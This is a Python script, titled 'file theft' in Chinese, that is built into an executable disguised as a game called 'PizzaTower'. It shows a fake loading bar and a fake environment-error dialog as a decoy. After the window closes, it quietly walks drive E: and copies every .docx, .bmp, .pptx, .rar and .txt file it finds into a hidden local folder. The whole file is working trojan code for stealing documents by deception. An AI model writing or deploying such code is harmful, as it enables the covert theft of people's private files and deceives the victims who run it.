# 文件窃取
# pyinstaller -F -w -i .\1.png .\1.py -n PizzaTower
import os
from win32 import *
from win32api import GetLogicalDriveStrings
from win32file import *
import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
import random

# 设置随机触发点（0~100 之间）
trigger_error_at = random.randint(10, 90)  # 避免太快或太慢触发
# print(f"[调试] 本次将在 {trigger_error_at}% 时触发错误")

def simulate_loading():
    for i in range(101):
        time.sleep(0.05)
        progress_var.set(i)
        progress_bar.update()

        if i == trigger_error_at:
            messagebox.showerror("错误", f"运行环境异常，程序在时终止。")
            root.destroy()
            return

root = tk.Tk()
root.title("正在加载")
root.resizable(False, False)
# root.iconbitmap("1.ico")    # 设置图标

# 设置窗口大小并居中
window_width = 300
window_height = 100
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
x = (screen_width // 2) - (window_width // 2)
y = (screen_height // 2) - (window_height // 2)
root.geometry(f"{window_width}x{window_height}+{x}+{y}")

# 标签提示
label = ttk.Label(root, text="正在初始化，请稍候…")
label.pack(pady=10)

# 进度条
progress_var = tk.IntVar()
progress_bar = ttk.Progressbar(root, maximum=100, length=250, variable=progress_var, mode="determinate")
progress_bar.pack(pady=10)

# 启动进度线程
threading.Thread(target=simulate_loading, daemon=True).start()

root.mainloop()

U = GetLogicalDriveStrings()
U_list = U.split('\x00')
U_list.pop(-1)

# for UP in U_list:
#     if GetDriveType(UP) == 2:   # 不同盘符类型：https://learn.microsoft.com/zh-cn/windows/win32/api/fileapi/nf-fileapi-getdrivetypea
#         break
# print(f"检测到目标盘:{UP}")

path = ".\\save\\"
if not os.path.exists(path):
    os.makedirs(path)

count = 0
for root,ds,fs in os.walk("E:\\"):
    for files in fs:
        if files.lower().endswith((".docx",".bmp",".pptx",".rar",".txt")):
            file_path = root + "\\" + files
            save_path = path + files
            CopyFile(file_path, save_path ,False)
            count += 1
            print(file_path)
print(f"已复制{count}个文件")
